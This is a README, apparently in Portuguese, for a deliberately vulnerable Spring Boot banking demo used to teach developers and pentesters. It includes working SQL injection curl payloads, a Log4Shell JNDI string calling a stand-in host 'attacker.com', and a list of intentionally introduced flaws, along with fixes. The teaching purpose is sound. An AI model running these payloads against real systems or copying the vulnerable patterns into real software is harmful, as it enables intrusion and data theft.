# Security Demo - Aplicação Bancária Vulnerável

## IMPORTANTE: APENAS PARA FINS EDUCATIVOS

Esta aplicação Spring Boot foi desenvolvida **INTENCIONALMENTE** com vulnerabilidades de segurança para demonstrar problemas comuns em aplicações web e como atacantes podem explorá-los.

**NÃO USE EM PRODUÇÃO!**

## Cenário da Demo

**Aplicação**: Microsserviço Java/Spring Boot de transações bancárias

**Vulnerabilidades simuladas**:
- **SQL Injection** - Queries concatenadas permitindo extração de dados
- **PII em log** - CPF, senhas e dados financeiros expostos nos logs
- **Endpoints sem proteção** - Configuração permitAll() inadequada
- **Dependência vulnerável** - Log4j 2.14.1 (CVE-2021-44228)

**Demonstração de ataques funcionando**:
- SQL Injection retorna todos os saldos
- Log mostra CPF em claro
- Endpoints sensíveis acessíveis sem autenticação
- Dependência vulnerável permite RCE

## Como Executar

### Pré-requisitos
- Java 11+
- Maven 3.6+
- curl (para testes)
- jq (opcional, para formatação JSON)

### 1. Executar a aplicação
```bash
mvn spring-boot:run
```

A aplicação estará disponível em: `http://localhost:8080`

### 2. Verificar se está funcionando
```bash
curl http://localhost:8080/api/usuarios/listar
```

## Demonstrações de Ataque

### Scripts por Vulnerabilidade

**1. SQL Injection** - `./scripts/1_sql_injection.sh`
- Extração de todos os saldos bancários
- Extração de todas as contas e transações
- Bypass de autenticação via login
- Análise técnica das queries vulneráveis

**2. PII em Logs** - `./scripts/2_pii_logs.sh`
- Geração de logs através de registro/login
- Logs de transferências bancárias
- Análise dos tipos de dados expostos
- Demonstração de vazamento de informações

**3. Endpoints sem Proteção** - `./scripts/3_endpoints_sem_protecao.sh`
- Acesso a endpoints sem autenticação
- Demonstração de configuração permitAll()
- Exposição de dados sensíveis sem autorização
- Análise técnica das configurações inadequadas

**4. Dados Expostos** - `./scripts/4_dados_expostos.sh`
- Listagem de usuários sem autenticação
- Exposição de contas bancárias e saldos
- Busca de usuários por CPF
- Consulta de saldos por faixa de valor

**5. Actuator - Informações Privadas** - `./scripts/5_actuator_info_privadas.sh`
- Download de heapdump da aplicação
- Análise de memória com VisualVM
- Extração de senhas do banco de dados
- Demonstração de vazamento via Actuator endpoints

**6. Dependência Vulnerável (Log4Shell)** - `./scripts/6_log4shell.sh`
- Verificação da versão Log4j vulnerável
- Simulação de payloads Log4Shell
- Análise do CVE-2021-44228
- Demonstração de vetores de ataque

### Ataques Manuais

#### 1. SQL Injection - Extrair todos os saldos
```bash
curl -s "http://localhost:8080/api/contas/buscar-por-saldo/0%20OR%201=1%20--" | jq .
```

#### 2. SQL Injection - Extrair todas as contas
```bash
curl -s "http://localhost:8080/api/contas/buscar-por-numero/%27%20OR%20%271%27=%271" | jq .
```

#### 3. Exposição de dados - Listar usuários (CPFs e senhas)
```bash
curl -s "http://localhost:8080/api/usuarios/listar" | jq .
```

#### 4. Endpoints sem Proteção - Teste completo
```bash
./scripts/3_endpoints_sem_protecao.sh
```

### Dados de Teste Disponíveis

| CPF | Nome | Senha | Conta | Saldo |
|-----|------|-------|-------|--------|
| 12345678901 | João Silva | senha123 | 12345-6 | R$ 15.000,50 |
| 98765432100 | Maria Santos | minhasenha | 98765-4 | R$ 25.000,75 |
| 11122233344 | Carlos Admin | admin123 | 11111-1 | R$ 100.000,00 |

## Vulnerabilidades Detalhadas

### 1. SQL Injection

**Localização**:
- `ContaBancariaRepository.java:21` - `findByNumeroContaVulneravel()`
- `ContaBancariaRepository.java:28` - `findContasComSaldoMaiorQue()`
- `UsuarioRepository.java:18` - `loginVulneravel()`
- `TransacaoRepository.java:16` - `findByTipoVulneravel()`

**Problema**: Queries SQL são construídas por concatenação de strings sem sanitização.

**Exploração**:
```sql
-- Query original
SELECT * FROM contas_bancarias WHERE numero_conta = 'USER_INPUT'

-- Com payload: ' OR '1'='1
SELECT * FROM contas_bancarias WHERE numero_conta = '' OR '1'='1'
-- Retorna TODOS os registros
```

**Endpoints vulneráveis**:
- `GET /api/contas/buscar-por-numero/{numeroConta}`
- `GET /api/contas/buscar-por-saldo/{saldoMinimo}`
- `GET /api/transacoes/buscar-por-tipo/{tipo}`
- `POST /api/auth/login`

### 2. PII em Logs

**Localização**:
- `UsuarioService.java:19` - Log de dados completos do usuário
- `TransacaoService.java:25` - Log de CPF em transferências
- `JwtUtil.java:23` - Log do JWT secret e token
- `DataInitializer.java:35` - Log de dados de inicialização

**Problema**: Informações pessoais (PII) são registradas em logs em texto claro.

**Dados expostos**:
- CPFs completos
- Senhas em texto claro
- Dados financeiros (saldos)
- Tokens JWT
- Emails e nomes

**Exemplo de log vulnerável**:
```
INFO - Criando usuário - CPF: 12345678901, Nome: João, Email: joao@email.com, Senha: senha123
INFO - Transferência - CPF: 12345678901 de conta 12345-6 para conta 98765-4 no valor de R$ 1000.00
DEBUG - Token JWT gerado: eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiVVNFUiI...
```

### 3. Endpoints sem Proteção

**Localização**:
- `SecurityConfig.java:25` - Configuração permitAll() inadequada

**Problemas**:
- Endpoints sensíveis configurados com permitAll()
- Dados de usuários acessíveis sem autenticação
- Configuração de segurança inadequada

**Exploração**:
```bash
# Acesso sem qualquer autenticação
curl -s "http://localhost:8080/api/usuarios/listar"
# Retorna todos os dados dos usuários
```

### 4. Dependência Vulnerável

**Localização**: `pom.xml:30`

**Problema**: Log4j versão 2.14.1 (vulnerável ao CVE-2021-44228 - Log4Shell)

**Exploração**:
```bash
# Payload LDAP injection (Log4Shell)
${jndi:ldap://attacker.com/exploit}
```

**Impacto**: Remote Code Execution (RCE)

### 5. Configuração de Segurança Inadequada

**Localização**: `SecurityConfig.java:25`

**Problemas**:
- Endpoints sensíveis sem autenticação
- Headers de segurança desabilitados
- Senhas sem criptografia (PasswordEncoder customizado vulnerável)
- CSRF desabilitado
- Frames permitidos

## Como Corrigir as Vulnerabilidades

### 1. SQL Injection
```java
// Vulnerável
@Query(value = "SELECT * FROM usuarios WHERE cpf = '" + ":cpf" + "'", nativeQuery = true)

// Seguro
@Query("SELECT u FROM Usuario u WHERE u.cpf = :cpf")
```

### 2. PII em Logs
```java
// Vulnerável
logger.info("Login - CPF: {}, Senha: {}", cpf, senha);

// Seguro
logger.info("Login attempt for user with ID: {}", userId);
```

### 3. Configuração de Segurança Adequada
```java
// Configuração segura
@Override
protected void configure(HttpSecurity http) throws Exception {
    http.authorizeRequests()
        .antMatchers("/api/auth/**").permitAll()
        .anyRequest().authenticated()
        .and()
        .csrf().disable()
        .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS);
}
```

### 4. Dependência Atualizada
```xml
<!-- Versão segura -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.0</version>
</dependency>
```

## Estrutura do Projeto

```
security-demo/
├── src/main/java/com/demo/security/
│   ├── SecurityDemoApplication.java
│   ├── config/
│   │   ├── DataInitializer.java
│   │   ├── JwtAuthenticationFilter.java
│   │   ├── JwtUtil.java
│   │   └── SecurityConfig.java
│   ├── controller/
│   │   ├── AuthController.java
│   │   ├── ContaBancariaController.java
│   │   ├── TransacaoController.java
│   │   └── UsuarioController.java
│   ├── model/
│   │   ├── ContaBancaria.java
│   │   ├── Transacao.java
│   │   └── Usuario.java
│   ├── repository/
│   │   ├── ContaBancariaRepository.java
│   │   ├── TransacaoRepository.java
│   │   └── UsuarioRepository.java
│   └── service/
│       ├── TransacaoService.java
│       └── UsuarioService.java
├── scripts/
│   ├── 1_sql_injection.sh
│   ├── 2_pii_logs.sh
│   ├── 3_endpoints_sem_protecao.sh
│   ├── 4_dados_expostos.sh
│   ├── 5_actuator_info_privadas.sh
│   └── 6_log4shell.sh
└── README.md
```

## Cenários de Uso Educativo

### Para Desenvolvedores
- Entender como vulnerabilidades são introduzidas
- Aprender a identificar problemas de segurança no código
- Praticar técnicas de code review focadas em segurança

### Para Pentesters
- Demonstrar impacto real de vulnerabilidades
- Praticar técnicas de exploração em ambiente controlado
- Criar relatórios de penetration testing

### Para DevSecOps
- Demonstrar importância de security scanning
- Mostrar como vulnerabilidades passam pelo pipeline
- Justificar implementação de gates de segurança

## Avisos Legais

**IMPORTANTE**

- Esta aplicação é **INTENCIONALMENTE VULNERÁVEL**
- Use **APENAS** para fins educativos e de treinamento
- **NÃO EXPONHA** esta aplicação na internet
- **NÃO USE** este código como base para aplicações reais
- Os autores **NÃO SE RESPONSABILIZAM** por uso inadequado

## Recursos Adicionais

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Spring Security Documentation](https://spring.io/projects/spring-security)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

**Desenvolvido para demonstrar vulnerabilidades de segurança em aplicações web. Use com responsabilidade!**